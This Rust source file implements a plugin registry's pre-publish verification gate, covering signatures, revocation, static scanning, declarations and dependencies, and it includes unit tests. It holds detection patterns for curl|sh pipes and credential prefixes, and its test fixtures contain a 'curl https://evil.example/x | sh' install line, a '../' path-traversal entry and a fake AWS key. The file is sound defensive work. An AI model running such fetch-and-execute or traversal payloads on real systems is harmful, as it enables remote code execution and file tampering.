//! M6 — F10 automated gate: full verification before publishing/updating (shared by
//! registry CI, the template release flow, and local dry runs).
//! Check order: manifest/schema → signature chain → static scan → declaration consistency → dependency existence.

use std::collections::BTreeMap;
use std::io::Read;
use std::path::Path;

use super::plugin::{Manifest, PluginManager};
use super::plugin_sig::{self, TrustedKey, VerifyOutcome};
use super::registry::{self, KeyStatus, RegistryIndex};

/// A single check result (serialized for CI).
#[derive(Debug, Clone, serde::Serialize)]
pub struct CheckResult {
    pub id: String,
    pub ok: bool,
    pub detail: String,
}

/// Automated-gate report: ok = everything passed.
#[derive(Debug, Clone, serde::Serialize)]
pub struct VerifyReport {
    pub ok: bool,
    pub package: String,
    pub checks: Vec<CheckResult>,
}

impl VerifyReport {
    fn push(&mut self, id: &str, ok: bool, detail: String) {
        self.checks.push(CheckResult {
            id: id.to_string(),
            ok,
            detail,
        });
    }

    /// Whether a check passed (test helper; missing counts as not run = not a failure).
    #[cfg(test)]
    pub fn check_ok(&self, id: &str) -> Option<bool> {
        self.checks.iter().find(|c| c.id == id).map(|c| c.ok)
    }
}

/// Thresholds (tests may shrink them; defaults = the frozen F10 values).
#[derive(Debug, Clone)]
pub struct GateLimits {
    /// .ocplugin file size cap (default 50MB).
    pub max_package_bytes: u64,
    /// Total unpacked size cap (default 256MB).
    pub max_total_bytes: u64,
}

impl Default for GateLimits {
    fn default() -> Self {
        Self {
            max_package_bytes: 50 * 1024 * 1024,
            max_total_bytes: 256 * 1024 * 1024,
        }
    }
}

/// Publishing gate: run the full suite once; any failed check → `report.ok = false`.
pub fn verify_package(
    archive: &Path,
    keys: &BTreeMap<String, TrustedKey>,
    index: Option<&RegistryIndex>,
    limits: &GateLimits,
) -> VerifyReport {
    let mut report = VerifyReport {
        ok: true,
        package: archive.display().to_string(),
        checks: Vec::new(),
    };

    // ① manifest: schema + lexical / reserved domains / declaration consistency (reusing the same validation as install).
    let manifest: Option<Manifest> = match read_manifest(archive) {
        Ok(m) => {
            match PluginManager::validate_manifest(&m) {
                Ok(()) => report.push("manifest", true, "schema/lexical/reserved-domains passed".to_string()),
                Err(e) => report.push("manifest", false, e),
            }
            Some(m)
        }
        Err(e) => {
            report.push("manifest", false, e);
            None
        }
    };

    // ⑥ S5a — sandbox declaration validity (an independent check: a fixed gate visible to registry CI)
    if let Some(m) = &manifest {
        let (ok, detail) = match &m.sandbox {
            None => (true, "no sandbox declaration".to_string()),
            Some(sb) => match crate::core::plugin::validate_sandbox(sb) {
                Ok(()) => (
                    true,
                    format!(
                        "sandbox: network={} fs.write={:?}",
                        sb.network.as_deref().unwrap_or("none"),
                        sb.fs
                            .as_ref()
                            .map(|f| f.write.clone())
                            .unwrap_or_default()
                    ),
                ),
                Err(e) => (false, e),
            },
        };
        report.push("sandbox", ok, detail);
    }

    // ② signature chain: must be Trusted; also check publisher revocation when an index is present.
    let (outcome, _source) = plugin_sig::verify_with(archive, keys, index);
    match &outcome {
        VerifyOutcome::Trusted { key_id } => {
            let mut ok = true;
            let mut detail = format!("signature valid (keyId={})", key_id);
            if let Some(idx) = index {
                if registry::key_status(idx, key_id) == KeyStatus::Revoked {
                    ok = false;
                    detail = format!("publisher key revoked: {}", key_id);
                }
            }
            report.push("signature", ok, detail);
        }
        VerifyOutcome::Unsigned => report.push(
            "signature",
            false,
            "unsigned: the gate requires a publisher signature (opencapx pack --key …)".to_string(),
        ),
        VerifyOutcome::UnknownKey { key_id } => report.push(
            "signature",
            false,
            format!("keyId not registered (trusted-keys / registry publishers): {}", key_id),
        ),
        other => report.push(
            "signature",
            false,
            format!("signature verification failed: {}", other.label()),
        ),
    }

    // ③ static scan: oversize / path traversal / curl|sh blacklist / plaintext-credential heuristics.
    check_static(&mut report, archive, manifest.as_ref(), limits);

    // ④ declaration consistency (mapping reconciliation).
    match &manifest {
        Some(m) => check_declaration(&mut report, m),
        None => report.push("declaration", false, "manifest unreadable, cannot reconcile".to_string()),
    }

    // ⑤ dependency existence (check entries when an index is present; without an index → format validation already covered in ①).
    match &manifest {
        Some(m) => check_dependencies(&mut report, m, index),
        None => report.push("dependency", false, "manifest unreadable, cannot verify".to_string()),
    }

    report.ok = report.checks.iter().all(|c| c.ok);
    report
}

fn read_manifest(archive: &Path) -> Result<Manifest, String> {
    let file = std::fs::File::open(archive)
        .map_err(|e| format!("cannot open {}: {}", archive.display(), e))?;
    let mut zip = zip::ZipArchive::new(file).map_err(|e| format!("bad zip: {}", e))?;
    let mut text = String::new();
    for i in 0..zip.len() {
        let mut entry = zip
            .by_index(i)
            .map_err(|e| format!("zip read error: {}", e))?;
        if entry.name() == "opencapx-plugin.json" {
            entry
                .read_to_string(&mut text)
                .map_err(|e| format!("manifest read error: {}", e))?;
            return serde_json::from_str(&text).map_err(|e| format!("bad manifest: {}", e));
        }
    }
    Err("missing opencapx-plugin.json at archive root".into())
}

/// Text extensions covered by the static scan.
const TEXT_EXTS: &[&str] = &[
    "sh", "bash", "zsh", "fish", "py", "js", "mjs", "cjs", "ts", "rb", "pl", "ps1", "txt", "md",
];

/// Command basenames treated as shell wrappers.
const SHELLS: &[&str] = &["sh", "bash", "zsh", "fish", "dash"];

fn check_static(
    report: &mut VerifyReport,
    archive: &Path,
    m: Option<&Manifest>,
    limits: &GateLimits,
) {
    let mut findings: Vec<String> = Vec::new();
    let size = std::fs::metadata(archive).map(|x| x.len()).unwrap_or(0);
    if size > limits.max_package_bytes {
        findings.push(format!(
            ".ocplugin over the limit: {} > {} bytes",
            size, limits.max_package_bytes
        ));
    }
    match std::fs::File::open(archive)
        .map_err(|e| e.to_string())
        .and_then(|f| zip::ZipArchive::new(f).map_err(|e| e.to_string()))
    {
        Ok(mut zip) => {
            let mut total: u64 = 0;
            for i in 0..zip.len() {
                let Ok(mut entry) = zip.by_index(i) else {
                    continue;
                };
                let name = entry.name().to_string();
                if name.starts_with('/')
                    || name.contains("..")
                    || name.contains('\\')
                    || Path::new(&name).is_absolute()
                {
                    findings.push(format!("unsafe path entry: {}", name));
                }
                let entry_size = entry.size();
                total += entry_size;
                if is_text_like(&name) && entry_size <= 1024 * 1024 {
                    let mut buf = String::new();
                    if entry.read_to_string(&mut buf).is_ok() {
                        scan_text_findings(&name, &buf, &mut findings);
                    }
                }
            }
            if total > limits.max_total_bytes {
                findings.push(format!(
                    "total unpacked size over the limit: {} > {} bytes",
                    total, limits.max_total_bytes
                ));
            }
        }
        Err(e) => findings.push(format!("cannot read archive: {}", e)),
    }
    if let Some(m) = m {
        if let Some(rt) = &m.runtime {
            let base = rt.command.rsplit('/').next().unwrap_or(&rt.command);
            if SHELLS.contains(&base) && rt.args.iter().any(|a| a == "-c") {
                findings.push(format!("runtime.command wrapped in shell -c: {}", rt.command));
            }
        }
    }
    if findings.is_empty() {
        report.push("static", true, "oversize/traversal/blacklist/credential scan passed".to_string());
    } else {
        report.push("static", false, findings.join("; "));
    }
}

fn is_text_like(name: &str) -> bool {
    let ext = name.rsplit('.').next().unwrap_or("").to_ascii_lowercase();
    TEXT_EXTS.contains(&ext.as_str())
}

fn scan_text_findings(name: &str, text: &str, out: &mut Vec<String>) {
    for (i, line) in text.lines().enumerate() {
        let n = i + 1;
        if is_pipe_to_shell(line) {
            out.push(format!("{}:{} download piped to shell (curl|sh style)", name, n));
        }
        if let Some(label) = find_secret(line) {
            out.push(format!("{}:{} suspected plaintext credential ({})", name, n, label));
        }
    }
}

fn is_pipe_to_shell(line: &str) -> bool {
    let has_downloader = line.contains("curl ") || line.contains("wget ");
    has_downloader
        && ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
            .iter()
            .any(|p| line.contains(p))
}

fn find_secret(line: &str) -> Option<&'static str> {
    if line.contains("-----BEGIN") && line.contains("PRIVATE KEY-----") {
        return Some("private key block");
    }
    for (prefix, label) in [
        ("AKIA", "AWS Access Key"),
        ("ghp_", "GitHub token"),
        ("github_pat_", "GitHub token"),
        ("glpat-", "GitLab token"),
        ("xoxb-", "Slack token"),
        ("xoxp-", "Slack token"),
        ("sk-", "API key"),
    ] {
        if contains_token(line, prefix) {
            return Some(label);
        }
    }
    None
}

/// Where the prefix occurs: the preceding char is non-alphanumeric (so `task-` does not
/// match `sk-`), followed by a token-character run of sufficient length.
fn contains_token(line: &str, prefix: &str) -> bool {
    let bytes = line.as_bytes();
    let min_run = if prefix == "AKIA" { 16 } else { 20 };
    let mut from = 0;
    while let Some(idx) = line[from..].find(prefix) {
        let at = from + idx;
        let prev_ok = at == 0 || !(bytes[at - 1] as char).is_ascii_alphanumeric();
        let run = line[at + prefix.len()..]
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-')
            .count();
        if prev_ok && run >= min_run {
            return true;
        }
        from = at + prefix.len();
        if from >= line.len() {
            break;
        }
    }
    false
}

fn check_declaration(report: &mut VerifyReport, m: &Manifest) {
    let mut findings: Vec<String> = Vec::new();
    let mut seen = std::collections::BTreeSet::new();
    for c in &m.capabilities {
        if !seen.insert(c.id().to_string()) {
            findings.push(format!("duplicate capability ID: {}", c.id()));
        }
    }
    for c in &m.capabilities {
        if let Some((perm, _)) = c.mapping() {
            if !m.permissions.iter().any(|p| p == perm) {
                findings.push(format!("mapped permission {} not listed in permissions[]", perm));
            }
        }
    }
    if findings.is_empty() {
        report.push("declaration", true, "mapping reconciliation passed".to_string());
    } else {
        report.push("declaration", false, findings.join("; "));
    }
}

fn check_dependencies(report: &mut VerifyReport, m: &Manifest, index: Option<&RegistryIndex>) {
    let Some(idx) = index else {
        report.push(
            "dependency",
            true,
            format!("{} dependencies passed format validation (no index, skipping existence)", m.dependencies.len()),
        );
        return;
    };
    let mut findings: Vec<String> = Vec::new();
    for dep in m.dependencies.keys() {
        if !idx.entries.iter().any(|e| &e.id == dep) {
            findings.push(format!("dependency not in registry entries: {}", dep));
        }
    }
    if findings.is_empty() {
        report.push("dependency", true, "dependency existence passed".to_string());
    } else {
        report.push("dependency", false, findings.join("; "));
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const TEST_SEED: [u8; 32] = [7u8; 32];
    const TEST_SEED_B: [u8; 32] = [9u8; 32];
    const TEST_KEY_ID: &str = "com.test.k";

    fn test_dir(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("ocx-verify-{}-{}", std::process::id(), tag));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn pubkey_hex(seed: [u8; 32]) -> String {
        ed25519_dalek::SigningKey::from_bytes(&seed)
            .verifying_key()
            .to_bytes()
            .iter()
            .map(|b| format!("{:02x}", b))
            .collect()
    }

    fn keys_with(seed: [u8; 32]) -> BTreeMap<String, TrustedKey> {
        let mut m = BTreeMap::new();
        m.insert(
            TEST_KEY_ID.to_string(),
            TrustedKey::Ed25519(
                ed25519_dalek::SigningKey::from_bytes(&seed)
                    .verifying_key()
                    .to_bytes(),
            ),
        );
        m
    }

    fn base_manifest(id: &str) -> serde_json::Value {
        json!({
            "id": id,
            "name": "Test Pkg",
            "version": "0.1.0",
            "apiVersion": "1",
            "type": "capability",
            "runtime": { "type": "process", "command": "true" },
            "capabilities": ["image.analyze"],
            "permissions": ["image.read"]
        })
    }

    fn write_zip(path: &Path, entries: &[(String, Vec<u8>)]) {
        use std::io::Write;
        use zip::write::SimpleFileOptions;
        let f = std::fs::File::create(path).unwrap();
        let mut w = zip::ZipWriter::new(f);
        for (name, data) in entries {
            w.start_file(name.clone(), SimpleFileOptions::default()).unwrap();
            w.write_all(data).unwrap();
        }
        w.finish().unwrap();
    }

    /// Two-phase signing (same method as the M2 golden vector): compute digest_v2 over the base package → sign → fill back and repack.
    fn make_signed(
        path: &Path,
        manifest: &serde_json::Value,
        extra: &[(&str, &str)],
        seed: [u8; 32],
        key_id: &str,
    ) {
        use ed25519_dalek::Signer;
        let unsigned = path.with_extension("unsigned.ocplugin");
        let mut entries: Vec<(String, Vec<u8>)> = vec![(
            "opencapx-plugin.json".to_string(),
            serde_json::to_vec(manifest).unwrap(),
        )];
        for (n, c) in extra {
            entries.push((n.to_string(), c.as_bytes().to_vec()));
        }
        write_zip(&unsigned, &entries);
        let digest = crate::core::signing::digest_v2(&unsigned).unwrap();
        let sk = ed25519_dalek::SigningKey::from_bytes(&seed);
        let sig = sk
            .sign(format!("opencapx-v2\n{}", digest).as_bytes())
            .to_bytes()
            .iter()
            .map(|b| format!("{:02x}", b))
            .collect::<String>();
        let mut m = manifest.clone();
        m["sha256"] = serde_json::Value::String(digest);
        m["signature"] = json!({ "alg": "ed25519", "keyId": key_id, "sig": sig });
        entries[0].1 = serde_json::to_vec(&m).unwrap();
        write_zip(path, &entries);
        let _ = std::fs::remove_file(&unsigned);
    }

    fn index_with(entries: &[&str], revoked: bool) -> RegistryIndex {
        let mut revoked_keys: Vec<serde_json::Value> = Vec::new();
        if revoked {
            revoked_keys.push(json!({"keyId": TEST_KEY_ID, "at": 1, "reason": "test"}));
        }
        serde_json::from_value(json!({
            "schemaVersion": 2,
            "generatedAt": 1,
            "publishers": [{
                "keyId": TEST_KEY_ID,
                "publicKey": pubkey_hex(TEST_SEED),
                "verified": true
            }],
            "revokedKeys": revoked_keys,
            "entries": entries.iter().map(|id| json!({
                "id": id, "name": "P", "author": {"keyId": TEST_KEY_ID}
            })).collect::<Vec<_>>(),
            "indexSignature": { "alg": "ed25519", "keyId": "k", "sig": "0" }
        }))
        .unwrap()
    }

    /// Positive: core::pack packages it → all checks pass (including the index).
    #[test]
    fn gate_passes_for_signed_package() {
        let dir = test_dir("ok");
        let src = dir.join("src");
        std::fs::create_dir_all(src.join("bin")).unwrap();
        std::fs::write(
            src.join("opencapx-plugin.json"),
            serde_json::to_string(&base_manifest("com.test.pkg")).unwrap(),
        )
        .unwrap();
        std::fs::write(src.join("bin").join("run.py"), "print('hi')\n").unwrap();
        let pkg = dir.join("com.test.pkg-0.1.0.ocplugin");
        crate::core::pack::pack_dir(&src, &TEST_SEED, TEST_KEY_ID, &pkg).unwrap();

        let idx = index_with(&["com.test.pkg"], false);
        let report = verify_package(&pkg, &keys_with(TEST_SEED), Some(&idx), &GateLimits::default());
        assert!(report.ok, "checks: {:?}", report.checks);
        assert_eq!(report.check_ok("manifest"), Some(true));
        assert_eq!(report.check_ok("signature"), Some(true));
        assert_eq!(report.check_ok("static"), Some(true));
        assert_eq!(report.check_ok("declaration"), Some(true));
        assert_eq!(report.check_ok("dependency"), Some(true));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// M6 — the template scaffold itself passes the gate (the template manifest is a legitimate starting point).
    #[test]
    fn gate_passes_for_plugin_template() {
        let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let tpl = repo.join("plugin-template");
        if !tpl.join("opencapx-plugin.json").is_file() {
            eprintln!("skip: plugin-template not present");
            return;
        }
        let dir = test_dir("tpl");
        let pkg = dir.join("template.ocplugin");
        crate::core::pack::pack_dir(&tpl, &TEST_SEED, TEST_KEY_ID, &pkg).unwrap();
        let report = verify_package(&pkg, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert!(report.ok, "checks: {:?}", report.checks);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 1: unsigned → rejected.
    #[test]
    fn gate_rejects_unsigned() {
        let dir = test_dir("unsigned");
        let pkg = dir.join("plain.ocplugin");
        write_zip(
            &pkg,
            &[(
                "opencapx-plugin.json".to_string(),
                serde_json::to_vec(&base_manifest("com.test.pkg")).unwrap(),
            )],
        );
        let report = verify_package(&pkg, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("signature"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 2: bad signature (same keyId but mismatched public key → BadSignature) → rejected.
    #[test]
    fn gate_rejects_bad_signature() {
        let dir = test_dir("badsig");
        let pkg = dir.join("bad.ocplugin");
        make_signed(&pkg, &base_manifest("com.test.pkg"), &[], TEST_SEED, TEST_KEY_ID);
        // The registered key is B's public key: same keyId, verification must fail
        let report = verify_package(&pkg, &keys_with(TEST_SEED_B), None, &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("signature"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 3: publisher revoked (locally trusted but still rejected) → rejected.
    #[test]
    fn gate_rejects_revoked_publisher() {
        let dir = test_dir("revoked");
        let pkg = dir.join("revoked.ocplugin");
        make_signed(&pkg, &base_manifest("com.test.pkg"), &[], TEST_SEED, TEST_KEY_ID);
        let idx = index_with(&["com.test.pkg"], true);
        let report = verify_package(&pkg, &keys_with(TEST_SEED), Some(&idx), &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("signature"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 4: path traversal entry → rejected.
    #[test]
    fn gate_rejects_traversal_entry() {
        let dir = test_dir("traversal");
        let pkg = dir.join("evil.ocplugin");
        write_zip(
            &pkg,
            &[
                (
                    "opencapx-plugin.json".to_string(),
                    serde_json::to_vec(&base_manifest("com.test.pkg")).unwrap(),
                ),
                ("../evil.txt".to_string(), b"pwn".to_vec()),
            ],
        );
        let report = verify_package(&pkg, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("static"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 5: oversize package (shrunk thresholds injected) → rejected.
    #[test]
    fn gate_rejects_oversize_package() {
        let dir = test_dir("oversize");
        let pkg = dir.join("big.ocplugin");
        make_signed(&pkg, &base_manifest("com.test.pkg"), &[], TEST_SEED, TEST_KEY_ID);
        let limits = GateLimits {
            max_package_bytes: 8,
            max_total_bytes: 8,
        };
        let report = verify_package(&pkg, &keys_with(TEST_SEED), None, &limits);
        assert!(!report.ok);
        assert_eq!(report.check_ok("static"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 6: duplicate capability ID (inconsistent mapping) → rejected.
    #[test]
    fn gate_rejects_duplicate_capability() {
        let dir = test_dir("dupe");
        let pkg = dir.join("dupe.ocplugin");
        let mut m = base_manifest("com.test.pkg");
        m["capabilities"] = json!(["image.analyze", "image.analyze"]);
        make_signed(&pkg, &m, &[], TEST_SEED, TEST_KEY_ID);
        let report = verify_package(&pkg, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("declaration"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 7: missing dependency (not in the index) → rejected.
    #[test]
    fn gate_rejects_missing_dependency() {
        let dir = test_dir("missingdep");
        let pkg = dir.join("dep.ocplugin");
        let mut m = base_manifest("com.test.pkg");
        m["dependencies"] = json!({ "com.example.ghost": "^1.0" });
        make_signed(&pkg, &m, &[], TEST_SEED, TEST_KEY_ID);
        let idx = index_with(&["com.test.pkg"], false);
        let report = verify_package(&pkg, &keys_with(TEST_SEED), Some(&idx), &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("dependency"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 8: runtime wrapped in shell -c (heuristic blacklist) → rejected.
    #[test]
    fn gate_rejects_shell_dash_c() {
        let dir = test_dir("shelldc");
        let pkg = dir.join("shell.ocplugin");
        let mut m = base_manifest("com.test.pkg");
        m["runtime"] = json!({ "type": "process", "command": "bash", "args": ["-c", "echo hi"] });
        make_signed(&pkg, &m, &[], TEST_SEED, TEST_KEY_ID);
        let report = verify_package(&pkg, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("static"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 9: curl|sh download pipe → rejected.
    #[test]
    fn gate_rejects_curl_pipe() {
        let dir = test_dir("curlpipe");
        let pkg = dir.join("curl.ocplugin");
        make_signed(
            &pkg,
            &base_manifest("com.test.pkg"),
            &[("install.sh", "curl https://evil.example/x | sh\n")],
            TEST_SEED,
            TEST_KEY_ID,
        );
        let report = verify_package(&pkg, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("static"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Attack case 10: plaintext credential (AWS key shape) → rejected.
    #[test]
    fn gate_rejects_plaintext_secret() {
        let dir = test_dir("secret");
        let pkg = dir.join("secret.ocplugin");
        make_signed(
            &pkg,
            &base_manifest("com.test.pkg"),
            &[("conf.py", "AWS_KEY = \"AKIAABCDEFGHIJKLMNOP\"\n")],
            TEST_SEED,
            TEST_KEY_ID,
        );
        let report = verify_package(&pkg, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert!(!report.ok);
        assert_eq!(report.check_ok("static"), Some(false));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// S5a — check type 6: the sandbox declaration summary is visible; an illegal declaration is rejected by the manifest check.
    #[test]
    fn sandbox_check_reports_declaration() {
        let dir = test_dir("sandbox-check");
        let mut m = base_manifest("com.test.sb");
        m["sandbox"] = json!({"network": "none", "fs": {"write": ["plugin-data"]}});
        let pkg = dir.join("ok.ocplugin");
        make_signed(&pkg, &m, &[], TEST_SEED, TEST_KEY_ID);
        let r = verify_package(&pkg, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert_eq!(r.check_ok("sandbox"), Some(true), "checks: {:?}", r.checks);
        assert!(r.ok);
        // Illegal network: rejected by ① manifest (same source as validate_manifest); the sandbox check does not appear
        let mut bad = base_manifest("com.test.sb2");
        bad["sandbox"] = json!({"network": "host"});
        let pkg2 = dir.join("bad.ocplugin");
        make_signed(&pkg2, &bad, &[], TEST_SEED, TEST_KEY_ID);
        let r2 = verify_package(&pkg2, &keys_with(TEST_SEED), None, &GateLimits::default());
        assert!(!r2.ok);
        assert_eq!(r2.check_ok("manifest"), Some(false));
        assert_eq!(r2.check_ok("sandbox"), Some(false), "check type 6 also proactively rejects illegal declarations");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
